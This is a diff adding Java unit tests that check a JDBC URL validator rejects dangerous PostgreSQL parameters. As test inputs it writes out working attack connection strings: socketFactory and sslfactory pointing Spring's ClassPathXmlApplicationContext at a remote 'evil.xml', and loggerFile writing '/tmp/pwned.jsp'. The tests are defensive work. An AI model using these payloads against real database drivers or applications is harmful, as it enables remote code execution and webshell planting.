@@ -246,12 +246,51 @@ public class SQLManagerTest {
     SQLManager.validateJdbcUrl(jdbcConnection);
   }
 
+  @Test
+  public void testValidateJdbcConnectionStringPostgresqlSocketFactory() {
+    exception.expect(IllegalArgumentException.class);
+    exception.expectMessage("Potentially dangerous JDBC parameter found: socketFactory");
+
+    String jdbcConnection = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:9090/evil.xml";
+
+    SQLManager.validateJdbcUrl(jdbcConnection);
+  }
+
+  @Test
+  public void testValidateJdbcConnectionStringPostgresqlSslFactory() {
+    exception.expect(IllegalArgumentException.class);
+    exception.expectMessage("Potentially dangerous JDBC parameter found: sslfactory");
+
+    String jdbcConnection = "jdbc:postgresql://127.0.0.1:5432/test?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&sslfactoryarg=http://127.0.0.1:9090/evil.xml";
+
+    SQLManager.validateJdbcUrl(jdbcConnection);
+  }
+
+  @Test
+  public void testValidateJdbcConnectionStringPostgresqlLoggerLevel() {
+    exception.expect(IllegalArgumentException.class);
+    exception.expectMessage("Potentially dangerous JDBC parameter found: loggerLevel");
+
+    String jdbcConnection = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=DEBUG&loggerFile=/tmp/pwned.jsp";
+
+    SQLManager.validateJdbcUrl(jdbcConnection);
+  }
+
   /**
    * Test fail if any exception is thrown therefore no assert
    */
   @Test
   public void testValidateJdbcConnectionStringMysqlPass() {
     String jdbcConnection = "jdbc:mysql://127.0.0.1:3306/mydb?allowedParameter=true";
+    SQLManager.validateJdbcUrl(jdbcConnection);
+  }
+
+  /**
+   * Test fail if any exception is thrown therefore no assert
+   */
+  @Test
+  public void testValidateJdbcConnectionStringPostgresqlPass() {
+    String jdbcConnection = "jdbc:postgresql://127.0.0.1:5432/mydb?ssl=true&sslmode=require";
     SQLManager.validateJdbcUrl(jdbcConnection);
   }
 }
